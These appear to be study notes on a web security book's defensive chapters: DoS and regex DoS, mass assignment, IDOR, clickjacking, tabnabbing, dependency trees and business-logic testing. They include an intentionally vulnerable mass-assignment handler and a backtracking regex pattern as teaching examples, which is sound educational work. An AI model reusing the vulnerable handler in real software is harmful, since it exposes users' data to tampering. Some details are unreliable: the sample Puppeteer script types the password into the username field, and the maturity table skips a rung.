The book calls this “quick and dirty” and says so honestly: it does not constrain order or frequency, both of which can still combine into unintended functionality. It does prevent commands that were never meant for the client. Allowlist over blocklist, always — because a future release adds a command your blocklist does not know about.

The architectural statement

A security-first architecture never lets a client supply a query or command that executes on the server. If user input must translate into server operations, map it to an allowlisted set of operations that a security review has already approved.

Chapter 32 · Defending Against DoS

You cannot detect what you do not measure — and DoS is the one attack family where the countermeasures can hurt real users.

Start with logging

Log every request with its response time, and log async job-style functions separately (backups, generators) — those produce no response, so a hang is invisible otherwise. Without this, a past DoS through a legitimate channel is simply not discoverable.

Then model the four outcomes the book lists from Chapter 14: exhaust server resources, exhaust client resources, request unavailable resources, deny access to resources.

Regex DoS

  • Know the shape: significant backtracking against a repeated group — (a[ab]*)+, where + demands all matches and * matches the subexpression maximally.
  • Catch it in review or with a linter. This is one place where tooling genuinely beats eyeballs: scanning regex for malicious patterns, or timing them against crafted inputs, is faster and less error-prone than reading them.
  • Never accept user-supplied regex. The book’s image: walking through a minefield hoping you memorised the safe path. Also check integrations — a dependency with a user-supplied regex is just as bad.

Logical DoS

Harder, because it is a matter of degree. Compare to XSS: binary, you either have it or you do not. DoS is a scale — so rank exposed functionality as high / medium / low risk rather than vulnerable/secure, and identify where critical resources are consumed. A powerful desktop may never notice a client-side function that freezes an old phone.

DDoS

Cannot be prevented; can be mitigated.

MitigationHow it worksTrade-off
Bandwidth management / scrubbing serviceVendor analyses each packet and drops traffic matching malicious patterns before it reaches youRecurring cost; vendors see your traffic
BlackholingRoute suspicious traffic to a server that looks alive and does nothing; real traffic goes to the real serverMisfires route real users into the hole; good for small attacks only
The oversensitivity trap

Every aggressive DoS filter blocks some legitimate traffic. Get deep metrics on how your real users behave before you turn the sensitivity up — otherwise the defence becomes the outage.

And a blunt piece of advice worth quoting: even if you do not expect to be a target, implement anti-DoS mitigations once you can afford them.

Chapter 33 · Defending Data and Objects

The shortest chapter in Part III, and the best return per line: allowlist the fields, allowlist the ids, and use a serializer that is not hand-rolled.

Mass assignment

The pattern to eliminate: trust the whole objectvulnerable
app.post("updatePlayerData", function(req, res, next) {
  if (!!req.body.data) {
    db.update(session.currentUser, req.body.data);  // every key the client sent
    return res.sendStatus(200);
  } else {
    return res.sendStatus(400);
  }
});

Two acceptable fixes:

1. Field allowlist — cheapthe fix
const allowlist = ["hp", "location"]; // only these two fields may be updated
2. Data Transfer Object — strongerthe fix
const DTO = function(hp, location) {
  this.hp = hp;
  this.location = location;
};
// construct from request data; anything else is dropped by design

The DTO is more work, but it makes the writable surface structural rather than a check somebody has to remember to add.

IDOR

  • Best: do not expose direct object references at all — mask the API call so the filename never appears, and authorise every file access.
  • Acceptable: random, high-entropy object ids — but only as a temporary measure and only alongside rate limits. Randomness without entropy is guessing with extra steps.
  • Always: an authorisation check before returning the object. The id is not the permission.

Serialization

Every serialization attack is built on a weak serializer, so the primary defence is boring: use a well-tested, popular library with a history of audits, on a popular format (JSON or YAML), not a novel format with no track record. Then handle the data itself:

  • Data that could later be interpreted as script — or that contains common escape characters — should be sanitised before serialisation, not after.
  • Allowlist input characters and object types where the serializer cannot handle them safely.

Prototype pollution, clickjacking and tabnabbing — three attacks, three near-configuration-level fixes, and one of them is a single HTML attribute.

Clickjacking

Two effective defences; note that X-Frame-Options is described as obsolete by most major browsers.

Frame ancestors — the one-liner that ends most clickjackingthe fix
Content-Security-Policy: frame-ancestors 'none';

/* or, if you must be frameable: */
Content-Security-Policy: frame-ancestors subdomain.my-website.com;

Over 95% of modern browsers support the directive. If you have a rare case that needs to run on an unsupported browser, fall back to a framebuster:

Framebuster: hidden until proven top-levellegacy fallback
/* in the <head> CSS */
html { display: none; }

/* in the body, after the CSS */
if (self === top) {
  document.documentElement.style.display = 'block';
}

Invisible by default means clicks cannot land on anything; if the page is not framed, it reveals itself. Older framebusters that run after render leave a window for clickjacking and can be delayed or halted by an attacker — which is why the hidden-by-default order matters.

Tabnabbing

  • COOP: Cross-Origin-Opener-Policy: same-origin — stops an opened page from holding a reference to the opener at all. First-line solution, except for multi-domain estates where a more relaxed value plus the next item is better.
  • Link attributes: rel="noopener noreferrer" sets window.opener to null and stops referrer leakage. Essential on any user-generated link.
  • Isolation policies (fetch metadata): the server reads Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest, Sec-Fetch-User and refuses requests that do not make sense.
A link you did not writerecommended
<a href="malicious-website.com" rel="noopener noreferrer">click me</a>
Refusing to be framed, using fetch metadatarecommended
app.get('/index.html', function(req, res, next) {
  const dest = req.headers["Sec-Fetch-Dest"];
  if (dest === "frame") {
    return res.sendStatus(400);   // framing attempt blocked
  } else {
    return res.sendFile("/index.html");
  }
});
Maturity note the book makes

Isolation policies are new and unevenly supported (fine in recent Chrome/Firefox, missing in Safari desktop/iOS and most international browsers). Treat fetch metadata as defence in depth — always alongside CSP and rel attributes, never instead of them.

Chapter 35 · Securing Third-Party Dependencies

You cannot review what you cannot see. First make the tree visible, then shrink it, then pin it.

The tree, not the dependency

Each dependency has dependencies (“fourth-party”), and those have more. Manually reviewing one library is feasible; reviewing its tree is not. That is the point of a dependency tree model.

Why model it: engineering-wise it allows deduplication (JQuery needed by three modules can be included once). Security-wise, it shows you which versions are present.

The same tree, in the real worldthe problem
Primary Application v1.6 → JQuery 3.4.0
Primary Application v1.6 → SPA Framework v1.3.2 → JQuery v2.2.1
Primary Application v1.6 → UI Component Library v4.5.0 → JQuery v2.2.1

Your app is on 3.4.0, but two dependencies drag in 2.2.1 — a version that may carry critical CVEs. Each unique dependency and every unique version of it must be evaluated. A hundred dependencies can become tens of thousands of tree entries.

Chapter 36 · Mitigating Business Logic Vulnerabilities

Hard to attack, easier to defend — because the defender has the one thing the attacker lacks: the business rules, written down.

Worst-case design (a worked argument)

Two algorithms. A1 has a median runtime of 5, but one run in ten takes n² = 25. A2 always takes 6. On medians, A1 wins (5 < 6).

RunsA1 totalA1 averageA2 average
9 × 5 ms + 1 × 25 ms70 ms7 ms6 ms

Over ten runs A1 averages 7 — about 16% slower than A2, despite the better median. That is best-case design, and the book’s rule is absolute: good security architects never use best-case design.

Applied to security: consider the malicious use case for every functional component, during architecture. That is where business logic flaws are cheapest to kill — the book’s ratio is “10 hours of fixes in architecture = 100 hours post-launch”.

Statistical modelling (finding what review misses)

A hybrid of fuzzing, data science and browser automation. It works in four stages:

  • Model inputs — rank likely values per field (dropdown frequency, common free-text values, most-selected radio), and deliberately include the rare ones: unusual characters, lengths, scripts. Those edge cases are where logic bugs live. Store the model as JSON/YAML/CSV.
  • Model actions — directional page flows plus clicks, links, form AJAX, modals, websocket calls, direct JS calls. Most companies already have this data in analytics.
  • Automate the flow in a headless browser against a safe local environment, with mock users in the database.
  • Analyse — log every request: payload, response, status. Unexpected errors and faults are your leads; even non-security bugs found this way improve the product.
Driving the app with Puppeteer from a model filebook code
import puppeteer from 'puppeteer';
import data from 'model';
import tools from 'tools';

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  await page.goto(data.startURL);
  await page.setViewport({width: 1080, height: 1024});

  // sign up
  await page.type('.sign-up-username', data[0].username);
  await page.type('.sign-up-username', data[0].password);
  await page.click('.sign-up');
  await tools.logSignUpStatus();

  // post a comment
  const commentBox = '.comment-box';
  await page.waitForSelector(commentBox);
  await page.type('.comment-box', data[0].messages[0]);
  await page.click('.submit-comment');
  await tools.logCommentStatus();

  await browser.close();
})();

Headless Chrome (via Puppeteer) is the modern standard, following Phantom.js and Slimer.js. The specific flows are always application-specific — the pattern is what transfers.

Don’t dismiss them as “just bugs”

Business logic flaws often look like ordinary programming bugs and get triaged as such. The book’s warning: the business logic in your source code is often your company’s most critical digital asset, and it gets more powerful — and more dangerous — as the app grows.

Chapter 37 · Part III Summary

The mitigations will date. The philosophies will not.

  • Every layer adds surface area — dependencies, caching, distribution. Exploitation gets easier, not harder, as the stack grows.
  • Defence must be comprehensive, meticulous, and regularly revised. A one-time security push is a snapshot of a moving target.
  • The leverage is in the architecture — zero trust, framework-level protections, automated discovery, threat modelling. Those reduce the number of decisions humans have to get right.
  • Specific mitigations will change as attacks shift and browsers ship built-in protections. The design philosophies — worst-case design, least authority, allowlists, verify every privileged action, test for regressions — are career-long.

The maturity ladder (author’s synthesis, not the book’s)

Part III is roughly ordered by maturity. Most teams sit on rung 2 or 3 and believe they are on 5. This framing is my summary of how the chapters build on each other.

RungWhat it looks likeWhat is still missingChapters
0 · ReactiveYou learn about bugs from customers or TwitterEverything—
1 · ConfiguredHTTPS, CSP, cookie flags, security headers, patched dependenciesNo design or review process; still finding bugs late22, 30, 33
2 · ReviewedArchitecture review + security code review at merge, with an anti-pattern checklistNothing catches logic flaws; regressions return21, 25
3 · ModeledThreat models with actors, vectors, mitigations and a delta; worst-case designDiscovery is ad hoc; no scoring, no closed loop24, 36
4 · DiscoveredStatic + dynamic analysis, disclosure programme, bounties, pen testsFixes are ad hoc; no regression tests; no metric26

6 · Designed-inZero trust, least authority, allowlists, secure-by-default frameworks, per-module isolationThe next unknown attack21, 31, 34, 35
The cheapest two rungs

If you can only do two things this quarter: enable CSP with frame-ancestors 'none' and hardened cookies (an afternoon), and add a security regression test to every closed security bug (minutes each, compounding forever). Both are in the book, both are cheap, and both survive refactors better than a checklist does.
